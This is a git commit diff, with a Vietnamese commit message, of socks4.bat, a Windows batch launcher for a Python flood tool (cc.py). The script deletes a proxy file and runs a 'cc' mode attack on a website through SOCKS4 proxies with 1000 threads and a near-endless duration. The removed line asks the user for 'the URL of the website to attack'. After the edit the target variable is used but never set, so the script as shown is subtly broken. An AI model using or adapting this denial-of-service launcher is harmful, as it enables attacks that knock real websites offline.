70202f3fa5e491033dcf91a9a561b50b91878a56
Ling <59746573+ndbiaw@users.noreply.github.com>
2022-08-29 05:33:41 +0700

    Fix lỗi hiển thị UTF-8, Fix không chạy vì chưa thêm path python3

--- socks4.bat
+++ socks4.bat
@@ -1,4 +1,3 @@
-echo @off
+@echo off
 del socks4.txt
-set /p SETURL="Nhập URL trang web cần tấn công: "
-python3 cc.py -url %SETURL% -m cc -v 4 -t 1000 -f socks4.txt -b 1 -s 999999999999999 -down -check
+python cc.py -url %SETURL% -m cc -v 4 -t 1000 -f socks4.txt -b 1 -s 999999999999999 -down -check
